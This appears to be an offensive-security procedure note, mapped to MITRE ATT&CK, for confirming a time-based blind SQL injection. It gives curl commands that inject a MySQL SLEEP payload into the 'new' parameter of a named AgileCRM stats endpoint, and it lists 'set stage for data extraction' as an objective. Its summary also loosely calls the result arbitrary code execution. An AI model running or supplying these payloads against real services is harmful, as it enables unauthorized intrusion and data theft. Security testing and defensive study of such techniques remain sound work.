---
id: proc-433792-confirm-blind-sqli
tags:
  - blind-sqli
  - time-based
  - poc
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-time-based-payload]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:16:07.769Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-Blind-SQL-Injection-with-Time-Based-Payload

## Summary

This procedure verifies a Blind SQL Injection by injecting a time-delay payload, such as MySQL's SLEEP function, to confirm arbitrary code execution without data exfiltration in the response.

## Description

Blind SQLi exploits lack confirmation via errors, so time-based techniques measure response delays to infer success. Here, the payload targets the 'new' parameter in the AgileCRM endpoint, causing a 5-second delay to validate the vuln.

## Requirements

1. Timer or scripting to measure response times
2. Understanding of MySQL functions like SLEEP
3. Stable network to baseline normal response times

## Defense

Defensive measures and detection strategies:

- Use query timeouts shorter than sleep durations
- Monitor for unusual response latencies in API logs
- Employ anomaly detection for injection patterns

## Objectives

1. Prove SQL execution capability
2. Differentiate from false positives
3. Set stage for data extraction

## Instructions

### Step 1: Baseline Normal Response

**Context**: Measure standard request time without payload.

**Command** ([[commands/curl-time-based-payload]]):
```bash
curl -w "%{time_total}s" 'https://stats2.agilecrm.com/addstats?new=test'
```

> Time the response (e.g., <1s) for comparison.

### Step 2: Inject Time-Based Payload

**Context**: Insert SLEEP to induce delay if injection succeeds.

**Command** ([[commands/curl-time-based-payload]]):
```bash
curl -w "%{time_total}s" 'https://stats2.agilecrm.com/addstats?new=(select*from(select(sleep(5)))a)'
```

> Expected output: Response time ~5s longer, confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-time-based-payload]]

## Tools Used


## Tags

- [[blind-sqli]]
- [[time-based]]
